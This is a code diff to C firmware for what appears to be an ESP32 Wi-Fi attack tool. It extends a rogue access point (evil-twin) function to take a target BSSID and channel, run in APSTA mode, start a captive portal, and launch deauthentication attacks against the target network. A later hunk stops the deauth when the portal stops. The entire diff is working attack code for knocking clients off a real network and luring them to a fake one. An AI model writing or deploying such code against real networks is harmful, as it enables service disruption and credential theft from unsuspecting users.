@@ -1932,24 +1932,24 @@ esp_err_t wifi_attacks_start_portal(const char *ssid) {
     return ESP_OK;
 }
 
-esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password) {
+esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password,
+                                     const uint8_t *target_bssid, uint8_t channel) {
     if (!ssid || !password) {
         ESP_LOGE(TAG, "Rogue AP requires both SSID and password");
         return ESP_ERR_INVALID_ARG;
     }
     
-    ESP_LOGI(TAG, "Starting Rogue AP: %s", ssid);
+    ESP_LOGI(TAG, "Starting Rogue AP: %s (ch %d)", ssid, channel);
     
     strncpy(evilTwinSSID, ssid, 32);
     evilTwinSSID[32] = '\0';
     
     karma_mode = true;
     
-    // Disconnect STA
     esp_wifi_disconnect();
     vTaskDelay(pdMS_TO_TICKS(200));
     
-    // Get or create AP netif
+    // Use APSTA mode so we can send raw deauth frames via WIFI_IF_AP
     esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
     if (!ap_netif) {
         ESP_LOGI(TAG, "Creating AP netif for Rogue AP...");
@@ -1960,12 +1960,16 @@ esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password) {
             esp_wifi_start();
             return ESP_FAIL;
         }
-        esp_wifi_set_mode(WIFI_MODE_AP);
+        esp_wifi_set_mode(WIFI_MODE_APSTA);
         esp_wifi_start();
         vTaskDelay(pdMS_TO_TICKS(500));
     } else {
-        esp_wifi_set_mode(WIFI_MODE_AP);
-        vTaskDelay(pdMS_TO_TICKS(100));
+        wifi_mode_t mode;
+        esp_wifi_get_mode(&mode);
+        if (mode != WIFI_MODE_APSTA) {
+            esp_wifi_set_mode(WIFI_MODE_APSTA);
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
     }
     
     esp_netif_dhcps_stop(ap_netif);
@@ -1984,7 +1988,7 @@ esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password) {
         .ap = {
             .ssid = "",
             .ssid_len = 0,
-            .channel = 1,
+            .channel = channel > 0 ? channel : 1,
             .password = "",
             .max_connection = 4,
             .authmode = WIFI_AUTH_WPA2_PSK,
@@ -2004,7 +2008,7 @@ esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password) {
     
     vTaskDelay(pdMS_TO_TICKS(1000));
     
-    ESP_LOGI(TAG, "Rogue AP active: %s (WPA2)", ssid);
+    ESP_LOGI(TAG, "Rogue AP active: %s (WPA2, ch %d)", ssid, channel);
     stats_clients_connected = 0;
     
     esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler, NULL);
@@ -2013,6 +2017,16 @@ esp_err_t wifi_attacks_start_rogue_ap(const char *ssid, const char *password) {
     start_portal_services();
     
     emit_evil_twin_event(EVIL_TWIN_EVENT_PORTAL_DEPLOYED, evilTwinSSID, NULL);
+    
+    // Start broadcast deauth to the target BSSID (same as Evil Twin)
+    if (target_bssid) {
+        wifi_scanner_save_target_bssids();
+        wifi_attacks_start_deauth();
+        emit_evil_twin_event(EVIL_TWIN_EVENT_DEAUTH_STARTED, evilTwinSSID, NULL);
+        ESP_LOGI(TAG, "Rogue AP deauth started against %02X:%02X:%02X:%02X:%02X:%02X",
+                 target_bssid[0], target_bssid[1], target_bssid[2],
+                 target_bssid[3], target_bssid[4], target_bssid[5]);
+    }
     
     return ESP_OK;
 }
@@ -2024,6 +2038,11 @@ esp_err_t wifi_attacks_stop_portal(void) {
     }
     
     ESP_LOGI(TAG, "Stopping captive portal...");
+    
+    // Stop deauth if running (Rogue AP starts deauth alongside portal)
+    if (deauth_attack_active) {
+        wifi_attacks_stop_deauth();
+    }
     
     // Unregister portal event handler
     esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, &portal_event_handler);
